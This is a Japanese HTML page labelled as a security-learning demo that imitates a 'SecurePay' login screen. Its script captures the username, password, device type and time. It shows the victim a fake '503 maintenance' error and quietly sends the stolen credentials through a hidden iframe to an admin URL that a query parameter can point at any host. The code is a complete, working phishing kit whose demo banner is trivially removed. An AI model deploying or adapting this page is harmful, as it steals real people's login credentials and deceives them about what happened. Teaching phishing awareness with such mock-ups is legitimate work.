<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ログイン | セキュリティ確認（デモ）</title>
  <link rel="stylesheet" href="style.css">
</head>
<body class="victim-body">
  
  <div class="demo-warning">
    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。
  </div>

  <!-- ログイン入力フォーム -->
  <div class="login-container" id="login-box">
    <div class="mock-logo">
      <span class="logo-icon">🛡️ S</span>
      <span>SecurePay</span>
    </div>

    <h2>アカウントログイン</h2>
    <p class="subtitle">サービスをご利用いただくにはログインが必要です</p>
    
    <form id="login-form">
      <div class="input-group">
        <label>ユーザーID / メールアドレス</label>
        <input type="text" id="username" placeholder="example@email.com" required>
      </div>
      <div class="input-group">
        <label>パスワード</label>
        <input type="password" id="password" placeholder="••••••••" required>
      </div>
      <button type="submit" id="login-btn" class="btn-primary">ログイン</button>
    </form>
  </div>

  <!-- ⚠️ エラー画面（ログインを押した後にスマホに表示される画面） -->
  <div class="login-container hidden" id="error-box">
    <div class="error-icon">⚠️</div>
    <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
    <p>現在システムメンテナンス中です。<br>恐れ入りますが、しばらく時間を置いてから再度お試しください。</p>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const adminUrl = urlParams.get('admin') || 'admin.html';

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      if (ua.includes("iPhone")) return "iPhone (iOS)";
      if (ua.includes("iPad")) return "iPad (iOS)";
      if (ua.includes("Android")) return "Androidスマホ";
      if (ua.includes("Windows")) return "Windows PC";
      if (ua.includes("Mac")) return "Mac PC";
      return "不明な端末";
    }

    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const device = getDeviceInfo();
      const time = new Date().toLocaleTimeString();

      const params = new URLSearchParams({
        time: time,
        device: device,
        username: username,
        password: password
      });

      // 1. スマホ側にはログイン画面を消して「エラー画面（メンテナンス中）」を出す！
      document.getElementById('login-box').classList.add('hidden');
      document.getElementById('error-box').classList.remove('hidden');

      // 2. PC側（管理者画面）にデータを送るための隠し通信（裏で別タブを開いてデータを飛ばすなど）
      // または、本番でPC画面に即座に反映させるための処理
      // ※スマホの画面自体はエラー画面のまま動きません！
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = `${adminUrl}?${params.toString()}`;
      document.body.appendChild(iframe);
    });
  </script>
</body>
</html>
